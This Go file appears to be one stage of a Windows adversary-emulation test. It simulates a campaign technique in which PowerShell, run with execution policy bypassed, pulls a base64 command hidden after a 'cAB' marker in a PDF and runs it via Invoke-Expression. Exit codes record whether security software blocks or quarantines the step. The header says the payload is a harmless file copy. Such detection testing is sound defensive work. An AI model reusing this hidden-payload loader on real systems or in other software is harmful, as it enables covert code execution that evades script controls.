//go:build windows
// +build windows

/*
STAGE 3: PowerShell Command Execution (T1059.001)
Simulates the July RedFlick chain: the PDF fetched by curl.exe in Stage 2
carries a base64 command hidden after the magic header "cAB". PowerShell
extracts the payload from the document and executes it via
Invoke-Expression, staging the file into the victim workspace — exactly the
extraction pattern Microsoft documented for the campaign.

The embedded command is benign (a file copy into ARTIFACT_DIR).
*/

package main

import (
	"context"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"time"
)

const (
	TEST_UUID      = "c3b4301e-b502-43a4-9f01-66a874239d1b"
	TECHNIQUE_ID   = "T1059.001"
	TECHNIQUE_NAME = "PowerShell: Embedded Payload Extraction (cAB magic header)"
	STAGE_ID       = 3

	INVITE_SUBDIR   = "StarBlizzardInvite"
	SOURCE_PDF      = "invite.pdf" // fetched to LOG_DIR by Stage 2
	STAGED_PDF_NAME = "staged_invitation.pdf"
)

const (
	StageSuccess     = 0
	StageBlocked     = 126
	StageQuarantined = 105
	StageError       = 999
)

func main() {
	AttachLogger(TEST_UUID, fmt.Sprintf("Stage %d: %s", STAGE_ID, TECHNIQUE_ID))
	LogMessage("INFO", TECHNIQUE_ID, fmt.Sprintf("Starting %s", TECHNIQUE_NAME))
	LogStageStart(STAGE_ID, TECHNIQUE_ID, "PowerShell extracts base64 payload after cAB marker and executes it")

	if err := performTechnique(); err != nil {
		fmt.Printf("[STAGE %s] Technique failed: %v\n", TECHNIQUE_ID, err)
		LogMessage("ERROR", TECHNIQUE_ID, fmt.Sprintf("Technique failed: %v", err))
		exitCode := determineExitCode(err)
		if exitCode == StageBlocked || exitCode == StageQuarantined {
			LogStageBlocked(STAGE_ID, TECHNIQUE_ID, err.Error())
		} else {
			LogStageEnd(STAGE_ID, TECHNIQUE_ID, "error", err.Error())
		}
		os.Exit(exitCode)
	}

	fmt.Printf("[STAGE %s] PowerShell payload extraction completed\n", TECHNIQUE_ID)
	LogMessage("SUCCESS", TECHNIQUE_ID, "base64 payload extracted from PDF and executed")
	LogStageEnd(STAGE_ID, TECHNIQUE_ID, "success", "payload extracted after cAB marker and executed via Invoke-Expression")
	os.Exit(StageSuccess)
}

func performTechnique() error {
	sourcePDF := filepath.Join(LOG_DIR, SOURCE_PDF)
	if _, err := os.Stat(sourcePDF); os.IsNotExist(err) {
		return fmt.Errorf("prerequisite missing: weaponized PDF not found at %s (Stage 2 must run first)", sourcePDF)
	}

	stagedPDF := filepath.Join(ARTIFACT_DIR, INVITE_SUBDIR, STAGED_PDF_NAME)
	_ = os.Remove(stagedPDF)

	// PowerShell performs the extraction — the real chain's observable is
	// powershell.exe reading the PDF, regex-matching the marker, decoding
	// base64 and invoking the result.
	script := fmt.Sprintf(
		`$c = [IO.File]::ReadAllText('%s'); `+
			`if ($c -match 'cAB([A-Za-z0-9+/=]{24,})') { `+
			`$p = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($Matches[1])); `+
			`Write-Output ('EXTRACTED:' + $p); `+
			`Invoke-Expression $p; `+
			`if (Test-Path '%s') { Write-Output 'STAGED_OK' } else { Write-Error 'staging output not present'; exit 4 } `+
			`} else { Write-Error 'cAB marker not found in document'; exit 3 }`,
		sourcePDF, stagedPDF)

	ctx, cancel := context.WithTimeout(context.Background(), 60*time.Second)
	defer cancel()
	cmd := exec.CommandContext(ctx, "powershell.exe", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", script)
	out, err := cmd.CombinedOutput()
	outputStr := strings.TrimSpace(string(out))
	LogProcessExecution("powershell.exe", "powershell.exe -NoProfile -ExecutionPolicy Bypass -Command <cAB extraction + Invoke-Expression>", pidOf(cmd), err == nil, exitCodeOf(err), outputStr)

	if ctx.Err() == context.DeadlineExceeded {
		return fmt.Errorf("powershell extraction exceeded 60s")
	}
	if err != nil {
		return fmt.Errorf("powershell extraction exited %d (output: %s)", exitCodeOf(err), outputStr)
	}
	if !strings.Contains(outputStr, "EXTRACTED:") {
		return fmt.Errorf("extraction marker absent from powershell output: %s", outputStr)
	}
	if !strings.Contains(outputStr, "STAGED_OK") {
		return fmt.Errorf("staged output not confirmed by extraction script: %s", outputStr)
	}

	extractedCmd := ""
	for _, line := range strings.Split(outputStr, "\n") {
		if strings.HasPrefix(strings.TrimSpace(line), "EXTRACTED:") {
			extractedCmd = strings.TrimPrefix(strings.TrimSpace(line), "EXTRACTED:")
			break
		}
	}
	LogMessage("INFO", TECHNIQUE_ID, fmt.Sprintf("extracted and executed payload: %s", extractedCmd))
	LogMessage("INFO", TECHNIQUE_ID, fmt.Sprintf("staged output verified: %s", stagedPDF))

	return nil
}

func exitCodeOf(err error) int {
	if err == nil {
		return 0
	}
	if exitErr, ok := err.(*exec.ExitError); ok {
		return exitErr.ExitCode()
	}
	return 999
}

func pidOf(cmd *exec.Cmd) int {
	if cmd != nil && cmd.Process != nil {
		return cmd.Process.Pid
	}
	return 0
}

func determineExitCode(err error) int {
	if err == nil {
		return StageSuccess
	}
	errStr := err.Error()
	if containsAny(errStr, []string{"access denied", "access is denied", "permission denied", "operation not permitted"}) {
		return StageBlocked
	}
	if containsAny(errStr, []string{"quarantined", "virus", "threat"}) {
		return StageQuarantined
	}
	if containsAny(errStr, []string{"not found", "not present", "does not exist", "no such", "not running", "not available", "prerequisite missing"}) {
		return StageError
	}
	return StageError
}

func containsAny(s string, substrings []string) bool {
	for _, substr := range substrings {
		if containsCI(s, substr) {
			return true
		}
	}
	return false
}

func containsCI(s, substr string) bool {
	return len(s) >= len(substr) && indexIgnoreCase(s, substr) >= 0
}

func indexIgnoreCase(s, substr string) int {
	s = toLowerStr(s)
	substr = toLowerStr(substr)
	for i := 0; i <= len(s)-len(substr); i++ {
		if s[i:i+len(substr)] == substr {
			return i
		}
	}
	return -1
}

func toLowerStr(s string) string {
	result := make([]byte, len(s))
	for i := 0; i < len(s); i++ {
		c := s[i]
		if c >= 'A' && c <= 'Z' {
			c = c + ('a' - 'A')
		}
		result[i] = c
	}
	return string(result)
}
